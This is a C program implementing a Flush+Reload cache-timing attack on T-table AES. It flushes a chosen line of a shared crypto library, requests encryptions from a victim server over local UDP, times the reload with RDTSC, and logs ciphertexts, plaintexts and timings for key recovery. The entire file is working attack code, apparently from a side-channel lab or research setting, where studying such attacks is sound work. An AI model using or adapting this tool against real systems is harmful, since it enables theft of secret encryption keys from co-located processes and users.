#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>

#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <sys/mman.h>
#include <sys/stat.h>

void clflush(volatile void* Tx) {
    asm volatile("lfence;clflush (%0) \n" :: "c" (Tx));
}

char *timingFileName;
char *cipherFileName;
char *plainFileName;
uint32_t numTraces = 1000000;

char *addr;
int fd = -1;
char *victimBinaryFileName;

FILE *timingFP, *cipherFP, *plainFP;
size_t offset;

uint8_t *plaintext, *ciphertext;
uint32_t *timing;
void *target;
struct sockaddr_in server;
int s;

void init();
void finish();
void printText(uint8_t *text, int count, char *header);
void generatePlaintext();
void doTrace();

void printHelp(char* argv[])
{
    fprintf(
            stderr,
            "Usage: %s [-t timing file name] "
            "[-c cipher file name] "
            "[-p plaintext file name (optional)] "
            "[-n number samples (default: 1M)] "
            "[-o shared library offset of your target (e.g. Te0)] "
            "[-v shared library] "
            "\n",
            argv[0]
           );
    exit(EXIT_FAILURE);
}

void parseOpt(int argc, char *argv[])
{
    int opt;
    while((opt = getopt(argc, argv, "c:t:n:p:v:o:")) != -1){
        switch(opt){
        case 'c':
            cipherFileName = optarg;
            break;
        case 't':
            timingFileName = optarg;
            break;
        case 'p':
            plainFileName = optarg;
            break;
        case 'n':
            numTraces = atoi(optarg);
            break;
        case 'o':
            offset = (int)strtol(optarg, NULL, 16);
            break;
        case 'v':
            victimBinaryFileName = optarg;
            break;
        default:
            printHelp(argv);
        }
    }
    if(timingFileName == NULL){
        printHelp(argv);
    }
    if(cipherFileName == NULL){
        printHelp(argv);
    }
    if (victimBinaryFileName == NULL){
        printHelp(argv);
    }
}

int main(int argc, char** argv)
{
    int i;
    parseOpt(argc, argv);
    printf("begin\n");
    init();
    printf("Collecting data\n");
    for (i = 0; i < numTraces; i++){
#ifdef DEBUG
        printf("Sample: %i\n", i);
#endif
        doTrace();
    }
    finish();
    printf("Done\n");
}

void generatePlaintext()
{
    int j;
    for(j = 0; j < 16; j++){
        plaintext[j] = random() & 0xff;
    }
#ifdef DEBUG
    printText(plaintext, 16, "plaintext");
#endif
}
void savePlaintext()
{
    if(plainFP == NULL)
        return;
    fwrite(plaintext, sizeof(uint8_t), 16, plainFP);
}
void saveCiphertext()
{
    fwrite(ciphertext, sizeof(uint8_t), 16, cipherFP);
}
void saveTiming()
{
    fwrite(timing, sizeof(uint32_t), 1, timingFP);
}
void saveTrace()
{
   saveCiphertext();
   saveTiming();
   savePlaintext();
}
static __inline__ uint64_t timer_start (void) {
        unsigned cycles_low, cycles_high;
        asm volatile ("CPUID\n\t"
                    "RDTSC\n\t"
                    "mov %%edx, %0\n\t"
                    "mov %%eax, %1\n\t": "=r" (cycles_high), "=r" (cycles_low)::
                    "%rax", "%rbx", "%rcx", "%rdx");
        return ((uint64_t)cycles_high << 32) | cycles_low;
}

static __inline__ uint64_t timer_stop (void) {
        unsigned cycles_low, cycles_high;
        asm volatile("RDTSCP\n\t"
                    "mov %%edx, %0\n\t"
                    "mov %%eax, %1\n\t"
                    "CPUID\n\t": "=r" (cycles_high), "=r" (cycles_low):: "%rax",
                    "%rbx", "%rcx", "%rdx");
        return ((uint64_t)cycles_high << 32) | cycles_low;
}
static __inline__ void maccess(void *p) {
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

uint32_t reload(void *target)
{
    volatile uint32_t time;
    uint64_t t1, t2;
    t1 = timer_start();
    maccess(target);
    t2 = timer_stop();
    return t2 - t1;
}

void doTrace()
{
    // generate a new plaintext
    generatePlaintext();
    // set the cache to a known state
    clflush(target);
    // ask victim for an encryption
    int status = send(s, plaintext, 16, 0);
    int r = recv(s, ciphertext, 16, 0);
    // check current cache state
    *timing = reload(target);
    // record timing and ciphertext
    saveTrace();
#ifdef DEBUG
    printText(ciphertext, 16, "ciphertext");
    printf("Timing: %i\n", *timing);
#endif
}
void printText(uint8_t *text, int count, char *header)
{
    int j;
    printf("%s:", header);
    for (j = 0; j < count; j++){
        printf("%02x ", (int)(text[j] & 0xff));
    }
    printf("\n");
}
void *map_offset(const char *file, size_t offset) {
  int fd = open(file, O_RDONLY);
  if (fd < 0)
    return NULL;

  char *mapaddress = mmap(0, sysconf(_SC_PAGE_SIZE), PROT_READ, MAP_PRIVATE, fd, offset & ~(sysconf(_SC_PAGE_SIZE) -1));
  close(fd);
  if (mapaddress == MAP_FAILED)
    return NULL;
  return (void *)(mapaddress+(offset & (sysconf(_SC_PAGE_SIZE) -1)));
}

void unmap_offset(void *address) {
  munmap((char *)(((uintptr_t)address) & ~(sysconf(_SC_PAGE_SIZE) -1)),
                sysconf(_SC_PAGE_SIZE));
}

void init()
{
    // setup network communication
    printf("setting up network communication\n");
    if (!inet_aton("127.0.0.1", &server.sin_addr)) exit(100);

    server.sin_family = AF_INET;
    server.sin_port = htons(10000);

    if ((s = socket(AF_INET, SOCK_DGRAM, 0)) == -1) exit(101);
    if (connect(s, (struct sockaddr *) &server, sizeof server) == -1) exit(102);

    // setup the target for monitoring
    printf("setting up target\n");
    target = map_offset(victimBinaryFileName, offset);

// #ifdef DEBUG
    printf("offset: %x\n", offset);
    printf("target: %p\n", target);
    printText(target, 16, "Target");
    // printText(target + 256 * 4, 16, "T1");
// #endif

    // setup files pointer for writing
    printf("preparing data collection\n");
    plaintext = (uint8_t *) malloc(sizeof(uint8_t) * 16);
    ciphertext = (uint8_t *) malloc(sizeof(uint8_t) * 16);
    timing = (uint32_t *) malloc(sizeof(uint32_t));

    timingFP = fopen(timingFileName, "w");
    cipherFP = fopen(cipherFileName, "w");
    if (plainFileName != NULL){
        plainFP = fopen(plainFileName, "w");
    }
}
void finish()
{
    free(plaintext);
    free(ciphertext);
    free(timing);

    fclose(timingFP);
    fclose(cipherFP);
    if( plainFP != NULL )
        fclose(plainFP);

    unmap_offset(target);
}
